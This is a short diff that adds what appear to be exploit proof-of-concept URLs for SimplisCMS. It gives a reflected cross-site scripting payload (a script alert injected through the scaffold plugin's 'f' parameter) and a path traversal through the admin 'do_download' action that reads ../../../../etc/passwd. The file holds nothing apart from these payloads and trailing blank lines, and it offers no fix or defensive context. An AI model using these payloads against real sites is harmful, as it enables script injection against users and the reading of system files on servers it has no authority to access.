@@ -1,0 +1,14 @@
+http://www.example.com/simpliscms/admin/application/plugins/scaffold/index.php?f=[ XSS ] # # http://www.example.com/simpliscms/admin/application/plugins/scaffold/index.php?f=&lt;FONT size=7 &gt;NassRaWi&lt;/FONT&gt; &lt;script&gt;alert(&quot;www.d99y.com&quot;)&lt;/script&gt;
+http://www.example.com/simpliscms/admin/index.php?action=do_download&amp;download_file=[ Read files ]&amp;page=&amp;section=pages # # # http://www.example.com/simpliscms/admin/index.php?action=do_download&amp;download_file=../../../../../../../etc/passwd&amp;page=&amp;section=pages
+http://www.example.com/demos/simpliscms/admin/index.php?action=do_download&amp;download_file=../../../../../../../etc/passwd&amp;page=&amp;section=pages
+
+
+
+
+
+
+
+
+
+
+
